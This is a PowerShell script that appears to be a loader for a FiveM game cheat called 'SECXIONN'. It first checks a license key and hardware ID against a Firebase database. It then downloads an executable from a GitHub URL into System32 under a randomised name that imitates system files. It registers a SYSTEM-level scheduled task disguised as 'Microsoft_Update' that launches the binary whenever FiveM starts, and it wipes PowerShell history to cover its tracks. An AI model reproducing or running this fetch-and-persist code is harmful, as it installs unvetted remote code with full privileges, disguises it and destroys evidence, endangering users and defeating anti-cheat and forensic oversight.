$ErrorActionPreference = "SilentlyContinue"
[Console]::Title = "STACKX | SECURE AUTHENTICATION"

# --- [ STACKX CONFIGURATION ] ---
$DbUrl = "https://project-8a76e-default-rtdb.asia-southeast1.firebasedatabase.app/licenses"

# --- [ SYSTEM FUNCTIONS ] ---
function Get-HWID {
    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
}

function Show-Header {
    $Host.UI.RawUI.BackgroundColor = "Black"
    Clear-Host
    Write-Host ""
    Write-Host "      ███████╗████████╗ █████╗  ██████╗██╗  ██╗██╗  ██╗" -ForegroundColor Magenta
    Write-Host "      ██╔════╝╚══██╔══╝██╔══██╗██╔════╝██║ ██╔╝╚██╗██╔╝" -ForegroundColor Magenta
    Write-Host "      ███████╗   ██║   ███████║██║     █████╔╝  ╚███╔╝ " -ForegroundColor White
    Write-Host "      ╚════██║   ██║   ██╔══██║██║     ██╔═██╗  ██╔██╗ " -ForegroundColor White
    Write-Host "      ███████║   ██║   ██║  ██║╚██████╗██║  ██╗██╔╝ ██╗" -ForegroundColor DarkGray
    Write-Host "      ╚══════╝   ╚═╝   ╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝" -ForegroundColor DarkGray
    Write-Host ""
    Write-Host "         [ STACKX AUTHENTICATION SYSTEM // V2.0 ]      " -ForegroundColor Magenta -BackgroundColor Black
    Write-Host "  =======================================================" -ForegroundColor DarkGray
    Write-Host ""
}

function Write-Console {
    param (
        [string]$Message,
        [string]$Type = "INFO"
    )
    
    switch ($Type) {
        "INFO"    { Write-Host "  [~] " -NoNewline -ForegroundColor DarkGray; Write-Host $Message -ForegroundColor White }
        "SUCCESS" { Write-Host "  [+] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -ForegroundColor White }
        "ERROR"   { Write-Host "  [!] " -NoNewline -ForegroundColor White -BackgroundColor DarkMagenta; Write-Host " $Message " -ForegroundColor White }
        "INPUT"   { Write-Host "  [>] " -NoNewline -ForegroundColor Magenta; Write-Host $Message -NoNewline -ForegroundColor White }
    }
}

# --- [ MAIN INITIALIZATION ] ---
Show-Header

Write-Console "Initializing secure connection..." "INFO"
Start-Sleep -Milliseconds 600

Write-Console "Please enter your STACKX License Key: " "INPUT"
$key = Read-Host ""

# ระบบดักจับการใส่ค่าว่าง (ป้องกันบั๊กจากการก๊อปปี้วาง)
if ([string]::IsNullOrWhiteSpace($key)) {
    Write-Host ""
    Write-Console "Authentication Aborted: License key cannot be empty." "ERROR"
    Start-Sleep 3 ; exit
}

$myHwid = Get-HWID

Write-Host ""
Write-Console "Authenticating with STACKX Servers..." "INFO"
Start-Sleep -Milliseconds 400

# --- [ VERIFICATION PROCESS ] ---
try {
    $data = Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Get

    if ($null -eq $data) {
        Write-Console "Authentication Failed: License key does not exist." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ($data.status -ne "active") {
        Write-Console "Authentication Failed: License is expired or revoked." "ERROR"
        Start-Sleep 3 ; exit
    }

    if ([string]::IsNullOrEmpty($data.hwid)) {
        Write-Console "Binding hardware signature to STACKX Network..." "INFO"
        $payload = @{ hwid = $myHwid } | ConvertTo-Json
        Invoke-RestMethod -Uri "$DbUrl/$key.json" -Method Patch -Body $payload
        Write-Console "Hardware bound successfully." "SUCCESS"
    } 
    elseif ($data.hwid -ne $myHwid) {
        Write-Console "Security Alert: Hardware ID mismatch detected." "ERROR"
        Write-Console "This license is strictly locked to another machine." "INFO"
        Start-Sleep 3 ; exit
    }

    # --- [ LOGIN SUCCESS ] ---
    Write-Host ""
    Write-Console "ACCESS GRANTED. Welcome to STACKX." "SUCCESS"
    Write-Host ""
    Write-Host "  Press any key to continue to dashboard..." -ForegroundColor DarkGray
    $null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")

} catch {
    Write-Console "Network Error: Could not reach STACKX Authentication Servers." "ERROR"
    Write-Console $_.Exception.Message "INFO"
    Start-Sleep 3 ; exit
}
# -------------------------

# --- [ ORIGINAL CODE START ] ---
$p_rand = @("font","drv","host","win","svc") | Get-Random
$m_rand = @("vcp","mgr","svc","hosts","core") | Get-Random
$r_rand = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
$fileName = "$p_rand$m_rand`_$r_rand.exe"
$taskName = "Microsoft_Update_$r_rand"
$destPath = "C:\Windows\System32\$fileName"
$exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhostt.exe"

while ($true) {
    Clear-Host
    Write-Host "1. Install & Persistence"
    Write-Host "2. Check Status"
    Write-Host "0. Exit"

    $choice = Read-Host "Select"

    if ($choice -eq "1") {
        Clear-Host
        Write-Host "Installing System..." -ForegroundColor Cyan

        try {
            Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
            Unblock-File -Path $destPath

            auditpol /set /subcategory:"Process Creation" /success:enable
            $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
            schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f

            Write-Host "Install complete!" -ForegroundColor Green
            Write-Host "SECXIONN will run automatically when FiveM starts." -ForegroundColor Yellow
            
            Clear-History
            Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
        }
        catch {
            Write-Host "Install failed!" -ForegroundColor Red
            Write-Host $_.Exception.Message -ForegroundColor Yellow
        }
        pause
    }
    elseif ($choice -eq "2") {
        Clear-Host
        Write-Host "--- SYSTEM INFO ---" -ForegroundColor Cyan
        if (Test-Path $destPath) {
            Write-Host "Status: Ready" -ForegroundColor Green
            Write-Host "File  : $fileName"
            Write-Host "Task  : $taskName"
        } else {
            Write-Host "Status: Not Installed" -ForegroundColor Red
        }
        pause
    }
  elseif ($choice -eq "0") {
        # คำสั่งล้างข้อความในไฟล์ประวัติ (ไฟล์ยังอยู่แต่ข้อมูลข้างในหายหมด)
        $p="$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
        if(Test-Path $p){ Clear-Content $p -Force }
        
        exit
    }
}
